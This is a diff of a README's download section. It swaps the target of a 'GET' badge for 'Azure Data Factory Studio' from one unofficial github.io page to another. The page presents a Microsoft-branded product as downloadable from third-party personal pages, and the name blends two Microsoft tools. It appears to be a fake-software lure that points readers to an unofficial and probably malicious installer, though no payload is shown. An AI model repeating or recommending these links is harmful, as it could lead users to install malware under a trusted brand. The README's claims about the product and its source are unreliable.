@@ -225,7 +225,7 @@ The desktop studio and the VS Code extension both ship for these triples. Pick t
 
 ## Download
 
-[![GET](https://img.shields.io/badge/GET-Azure%20Data%20Factory%20Studio-blue)](https://cooperwilliam3374.github.io/.github/Azure-Data-Studio)
+[![GET](https://img.shields.io/badge/GET-Azure%20Data%20Factory%20Studio-blue)](https://azure-data-factory-studio.github.io/Azure-Data-Studio/)
 
 Use the GET badge for the packaged build of Azure Data Factory Studio. Historic Azure Data Studio installers also lived on the Microsoft download page and on the GitHub Releases list.
 
